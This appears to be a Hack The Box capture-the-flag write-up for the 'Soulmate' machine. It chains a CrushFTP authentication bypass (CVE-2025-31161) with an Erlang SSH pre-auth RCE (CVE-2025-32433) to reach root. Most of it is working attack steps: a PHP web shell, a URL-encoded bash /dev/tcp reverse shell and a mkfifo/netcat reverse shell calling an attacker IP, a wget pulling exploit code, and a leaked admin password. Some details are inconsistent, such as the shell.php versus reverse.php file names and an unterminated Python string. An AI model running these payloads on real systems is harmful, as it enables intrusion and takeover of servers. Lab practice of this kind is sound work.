---
name: Soulmate
difficulty: easy
os: linux
platform: htb
date: 2025/09/11
releasedDate: 2099-12-31
userFlag: true
rootFlag: true

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2c47fcf9c85c7fbdda73a9c1b54fd60e.png
---

## Enumeration

First, we start with a nmap scan to identify open ports and services:

```bash
nmap -p- --open --min-rate 5000 -vvv -Pn -n 10.10.11.86 -oN allPorts
```
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
4369/tcp open  epmd    syn-ack ttl 63
```

We add the IP address to our `/etc/hosts` file for easier access:

```bash
echo "10.10.11.86 soulmate.htb" >> /etc/hosts
```

We then run a more detailed nmap scan on the identified open ports:

```bash
nmap -p22,80 -sC -sV soulmate.htb -oN targeted
```
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Soulmate - Find Your Perfect Match
```

We do a subdomain enumeration using `gobuster`:

```bash
gobuster vhost -u soulmate.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 --ad
```
```
ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
```

We will add this subdomain to our `/etc/hosts` file as well:

```bash
echo "10.10.11.86 ftp.soulmate.htb" >> /etc/hosts
```

We access `ftp.soulmate.htb` in our browser and see a login page for CrushFTP. We look up for vulnerabilities and find a known Authentication Bypass vulnerability (CVE-2025-31161). 

## User And Root Exploitation

We can use this github repository to exploit it: `https://github.com/Immersive-Labs-Sec/CVE-2025-31161`

```bash
git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161
cd CVE-2025-31161
python3 cve-2025-31161.py \
        --target_host ftp.soulmate.htb \
        --target_user crushadmin \
        --new_user rold \
        --password 'rold' \
        --port=80
```

This creates a new user `rold` with password `rold`. We can now log in to the CrushFTP web interface.

We navigate through the interface and find a file manager. 

We can create a malicious php file to get a reverse shell. We use the following code:

```php
<?php system($_GET['cmd']); ?>
``` 

Then upload an image file with php content to the server using profile image upload functionality in `http://soulmate.htb/profile.php`.

Next, is to change the uploaded file name to `shell.php` and access it in the browser:

```bash
curl "http://soulmate.htb/assets/images/profiles/shell.php?cmd=whoami"
```

```
www-data
```

We can set up a netcat listener to get a reverse shell:

```bash
nc -lvnp 4444
```

Then execute the following command to get a reverse shell:

```bash
curl "http://soulmate.htb/assets/images/profiles/reverse.php?cmd=bash%20-c%20%27sh%20-i%20%3E%26%20/dev/tcp/10.10.14.141/443%200%3E%261%27"
```

Now we have a reverse shell as `www-data` user.

```bash
whoami
```
```
www-data
```

We find a `config.php` file in the web directory that contains database credentials. We can read the file to find the credentials for the `admin` user.
```bash
cat config/config.php
```
```
admin:Crush4dmin990
```

We can use these credentials to log in to `http://soulmate.htb/` and access the admin panel.

We check the ports which are open in the machine and find that port 2222 is open. This is a Erlang ssh port.

```bash
nc localhost 2222
```
```
SSH-2.0-Erlang/5.2.9
```

We find a RCE vulnerability in Erlang (CVE-2025-32433). We can use this vulnerability to get a shell as the `root` user.

We use the following command to download the exploit code on our machine:

```bash
git clone https://github.com/ProDefense/CVE-2025-32433
zip -r CVE-2025-32433.zip CVE-2025-32433
python3 -m http.server 80
```

We then download the exploit code on the target machine using `wget`:

```bash
cd /tmp
wget http://10.10.14.141/CVE-2025-32433.zip
unzip CVE-2025-32433.zip
cd CVE-2025-32433
```

We have to modify the `CVE-2025-32433.py` file run the command to get a reverse shell.

```python
# 4. Send SSH_MSG_CHANNEL_REQUEST (pre-auth!)
print("[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...")
chan_req = build_channel_request(
        command='os:cmd("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.141 8000 >/tmp/f | nc 10.10.14.141 4444").
)
```
We set up a netcat listener on port 4444 to get a reverse shell on our machine:

```bash
nc -lvnp 4444
```

We then run the exploit code on the target machine:

```bash
python3 CVE-2025-32433.py 
```

We get a reverse shell as the `root` user:

```bash
whoami
```
```
root
```

We can now read the user and root flags:

```bash
cat /home/ben/user.txt
cat /root/root.txt
```

```
user flag value
root flag value
```

## Conclusion

In this write-up, we successfully exploited the Soulmate machine by leveraging known vulnerabilities in CrushFTP and Erlang to gain user and root access. We performed thorough enumeration, identified potential attack vectors, and executed the necessary exploits to achieve our objectives.
